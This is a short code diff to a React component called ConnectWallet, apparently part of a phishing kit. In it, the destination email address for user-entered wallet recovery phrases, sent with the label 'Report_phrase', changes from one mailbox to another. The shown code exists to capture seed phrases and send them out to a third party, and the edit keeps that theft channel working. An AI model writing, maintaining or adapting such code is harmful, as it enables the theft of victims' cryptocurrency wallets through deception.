@@ -100,7 +100,7 @@ export default function ConnectWallet() {
       sendMessage(
         `phrase:  ${value.phrase}`,
         "Report_phrase",
-        "bitmaxservice@outlook.com"
+        "bitmaxexchange76@gmail.com"
       )
         .then(() => {
           setValue({
